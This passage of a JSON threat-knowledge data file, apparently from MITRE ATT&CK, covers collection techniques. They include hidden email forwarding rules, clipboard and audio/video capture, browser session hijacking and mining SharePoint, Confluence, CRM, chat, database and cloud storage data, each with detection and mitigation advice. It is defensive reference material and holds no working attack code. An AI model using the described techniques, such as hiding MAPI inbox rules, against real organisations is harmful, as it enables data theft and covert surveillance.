href=\"https://support.apple.com/guide/mail/reply-to-forward-or-redirect-emails-mlhlp1010/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mac Forwarding Rules)</a>\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools. <a href=\"https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pfammatter - Hidden Inbox Rules)</a>\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. <a href=\"https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Mail Flow Rules 2023)</a> Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.","detection":"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values. <a href=\"https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pfammatter - Hidden Inbox Rules)</a>\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox. <a href=\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)</a> High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":["Linux","macOS","Office Suite","Windows"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","Cloud Service: Cloud Service Metadata"],"mitigations":[{"id":"M1041","name":"Encrypt Sensitive Information","description":"Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling external email forwarding. <a href=\"https://www.microsoft.com/security/blog/2021/06/14/behind-the-scenes-of-business-email-compromise-using-cross-domain-threat-data-to-disrupt-a-large-bec-infrastructure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BEC Campaign)</a>"},{"id":"M1047","name":"Audit","description":"Enterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis.\n\nIn an Exchange environment, Administrators can use <code>Get-InboxRule</code> / <code>Remove-InboxRule</code> and <code>Get-TransportRule</code> / <code>Remove-TransportRule</code> to discover and remove potentially malicious auto-fowarding and transport rules. <a href=\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)</a> <a href=\"https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/manage-mail-flow-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Manage Mail Flow Rules 2023)</a> <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/get-inboxrule?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Get-InboxRule)</a> In addition to this, a MAPI Editor can be utilized to examine the underlying database structure and discover any modifications/tampering of the properties of auto-forwarding rules. <a href=\"https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pfammatter - Hidden Inbox Rules)</a>"},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. \n\nFor highly sensitive information, utilize out-of-band communication channels instead of relying solely on email. This reduces the risk of sensitive data being collected through compromised email accounts.\n\nSet up out-of-band alerts to notify security teams of unusual email activities, such as mass forwarding or large attachments being sent, which could indicate email collection attempts.\n\nCreate plans for leveraging a secure out-of-band communications channel, rather than an existing in-network email server, in case of a security incident. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}]}]},{"id":"T1115","name":"Clipboard Data","description":"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. <a href=\"https://msdn.microsoft.com/en-us/library/ms649012\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Clipboard)</a> <a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: clip_win_server)</a> <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa21-200b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA_AA21_200B)</a> Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation). <a href=\"https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mining_ruby_reversinglabs)</a>\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents. <a href=\"https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Operating with EmPyre)</a>","detection":"Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1119","name":"Automated Collection","description":"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. <a href=\"https://www.mandiant.com/resources/blog/unc3944-sms-phishing-sim-swapping-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant UNC3944 SMS Phishing 2023)</a> \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.","detection":"Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as Data Staged. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell, as well as through cloud APIs and command line interfaces.","platforms":["IaaS","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["User Account: User Account Authentication","Command: Command Execution","File: File Access","Script: Script Execution"],"mitigations":[{"id":"M1029","name":"Remote Data Storage","description":"Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. Strong passwords should be used on certain encrypted documents that use them to prevent offline cracking through Brute Force techniques."}],"subTechniques":[]},{"id":"T1123","name":"Audio Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Attor.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Attor Oct 2019)</a>\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.","detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1125","name":"Video Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. <a href=\"https://objective-see.com/blog/blog_0x25.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objective-see 2017 review)</a>","detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1185","name":"Browser Session Hijacking","description":"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques. <a href=\"https://en.wikipedia.org/wiki/Man-in-the-browser\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Man in the Browser)</a>\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. <a href=\"https://www.cobaltstrike.com/help-browser-pivoting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cobalt Strike Browser Pivot)</a> <a href=\"https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ICEBRG Chrome Extensions)</a> Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication. <a href=\"https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cobaltstrike manual)</a>","detection":"This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. New processes may not be created and no additional software dropped to disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for Process Injection against browser applications.","platforms":["Windows"],"dataSources":["Process: Process Modification","Process: Process Access","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Close all browser sessions regularly and when they are no longer needed."},{"id":"M1018","name":"User Account Management","description":"Since browser pivoting requires a high integrity process to launch from, restricting user permissions and addressing Privilege Escalation and Bypass User Account Control opportunities can limit the exposure to this technique."}],"subTechniques":[]},{"id":"T1213","name":"Data from Information Repositories","description":"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., Transfer Data to Cloud Account). \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., Unsecured Credentials) \n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) \n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:\n\n* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases \n* Collaboration platforms such as SharePoint, Confluence, and code repositories\n* Messaging platforms such as Slack and Microsoft Teams \n\nIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch. <a href=\"https://www.mitiga.io/blog/how-mitiga-found-pii-in-exposed-amazon-rds-snapshots\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mitiga)</a> <a href=\"https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Exposed Redis 2020)</a> <a href=\"https://cybernews.com/security/thomson-reuters-leaked-terabytes-sensitive-data/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybernews Reuters Leak 2022)</a>","detection":"As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. <a href=\"https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SharePoint Logging)</a> Sharepoint audit logging can also be configured to report when a user shares a resource. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/compliance/use-sharing-auditing?view=o365-worldwide#sharepoint-sharing-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sharepoint Sharing Events)</a> The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. <a href=\"https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Atlassian Confluence Logging)</a> Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.","platforms":["Linux","Windows","macOS","SaaS","IaaS","Office Suite"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in repositories."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Encrypt data stored at rest in databases."},{"id":"M1047","name":"Audit","description":"Consider periodic review of accounts and privileges for critical and sensitive repositories. Ensure that repositories such as cloud-hosted databases are not unintentionally exposed to the public, and that security groups assigned to them permit only necessary and authorized hosts. <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS DB VPC)</a>"},{"id":"M1054","name":"Software Configuration","description":"Consider implementing data retention policies to automate periodically archiving and/or deleting data that is no longer needed."},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Create plans for leveraging a secure out-of-band communications channel, rather than existing in-network chat applications, in case of a security incident. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}],"subTechniques":[{"id":"T1213.001","name":"Confluence","description":"Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., Unsecured Credentials)\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources","detection":"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nUser access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. <a href=\"https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Atlassian Confluence Logging)</a> Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.","platforms":["SaaS"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in Confluence repositories."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."},{"id":"M1047","name":"Audit","description":"Consider periodic review of accounts and privileges for critical and sensitive Confluence repositories."}]},{"id":"T1213.002","name":"Sharepoint","description":"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., Unsecured Credentials)\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources","detection":"The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. <a href=\"https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SharePoint Logging)</a>. As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.","platforms":["Office Suite","Windows"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content","Cloud Service: Cloud Service Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in SharePoint repositories."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."},{"id":"M1047","name":"Audit","description":"Consider periodic review of accounts and privileges for critical and sensitive SharePoint repositories."}]},{"id":"T1213.003","name":"Code Repositories","description":"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or Unsecured Credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts. <a href=\"https://www.wired.com/story/uber-paid-off-hackers-to-hide-a-57-million-user-data-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wired Uber Breach)</a> <a href=\"https://krebsonsecurity.com/2013/10/adobe-to-announce-source-code-customer-data-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs Adobe)</a>\n\n<strong>Note:</strong> This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.","detection":"Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.","platforms":["SaaS"],"dataSources":["Application Log: Application Log Content","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in code repositories."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization for code repositories."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for logons to code repositories."},{"id":"M1047","name":"Audit","description":"Consider periodic reviews of accounts and privileges for critical and sensitive code repositories. Scan code repositories for exposed credentials or other sensitive information."}]},{"id":"T1213.004","name":"Customer Relationship Management Software","description":"Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\n\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized Phishing emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations. <a href=\"https://www.bleepingcomputer.com/news/security/uscellular-discloses-data-breach-after-billing-system-hack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer US Cellular Hack 2022)</a> <a href=\"https://www.bleepingcomputer.com/news/security/mint-mobile-hit-by-a-data-breach-after-numbers-ported-data-accessed/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer Mint Mobile Hack 2021)</a> <a href=\"https://www.bleepingcomputer.com/news/security/customer-owned-bank-informs-100k-of-breach-exposing-account-balance-pii/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer Bank Hack 2020)</a>\n\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.","detection":"","platforms":["SaaS"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in CRM databases and acceptable handling of customer data. Only store customer information required for business operations."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."},{"id":"M1047","name":"Audit","description":"Consider periodic review of accounts and privileges for critical and sensitive CRM data."},{"id":"M1054","name":"Software Configuration","description":"Consider implementing data retention policies to automate periodically archiving and/or deleting data that is no longer needed."}]},{"id":"T1213.005","name":"Messaging Applications","description":"Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: \n\n* Testing / development credentials (i.e., Chat Messages) \n* Source code snippets \n* Links to network shares and other internal resources \n* Proprietary data <a href=\"https://www.theguardian.com/games/2022/sep/19/grand-theft-auto-6-leak-who-hacked-rockstar-and-what-was-stolen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Guardian Grand Theft Auto Leak 2022)</a>\n* Discussions about ongoing incident response efforts <a href=\"https://www.scmagazine.com/analysis/ragnar-locker-reminds-breach-victims-it-can-read-the-on-network-incident-response-chat-rooms\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SC Magazine Ragnar Locker 2021)</a> <a href=\"https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DEV-0537)</a>\n\nIn addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts. <a href=\"https://www.sentinelone.com/labs/nullbulge-threat-actor-masquerades-as-hacktivist-group-rebelling-against-ai/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sentinel Labs NullBulge 2024)</a> <a href=\"https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso Scattered Spider 2023)</a>","detection":"","platforms":["Office Suite","SaaS"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be posted in chat applications."},{"id":"M1047","name":"Audit","description":"Preemptively search through communication services to find inappropriately shared data, and take actions to reduce exposure when found."},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Implement secure out-of-band communication channels to use as an alternative to in-network chat applications during a security incident. This ensures that critical communications remain secure even if primary messaging channels are compromised by adversaries. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}]},{"id":"T1213.006","name":"Databases","description":"Adversaries may leverage databases to mine valuable information. These databases may be hosted on-premises or in the cloud (both in platform-as-a-service and software-as-a-service environments). \n\nExamples of databases from which information may be collected include MySQL, PostgreSQL, MongoDB, Amazon Relational Database Service, Azure SQL Database, Google Firebase, and Snowflake. Databases may include a variety of information of interest to adversaries, such as usernames, hashed passwords, personally identifiable information, and financial data. Data collected from databases may be used for Lateral Movement, Command and Control, or Exfiltration. Data exfiltrated from databases may also be used to extort victims or may be sold for profit. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence UNC5537 Snowflake 2024)</a>","detection":"","platforms":["IaaS","Linux","macOS","SaaS","Windows"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Develop and publish policies that define acceptable information to be stored in databases and acceptable handling of customer data. Only store information required for business operations."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Encrypt data stored at rest in databases."},{"id":"M1047","name":"Audit","description":"Consider periodic review of accounts and privileges for critical and sensitive databases."},{"id":"M1054","name":"Software Configuration","description":"Consider implementing data retention policies to automate periodically archiving and/or deleting data that is no longer needed."}]}]},{"id":"T1530","name":"Data from Cloud Storage","description":"Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a> <a href=\"https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Storage Security, 2019)</a> <a href=\"https://cloud.google.com/storage/docs/best-practices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google 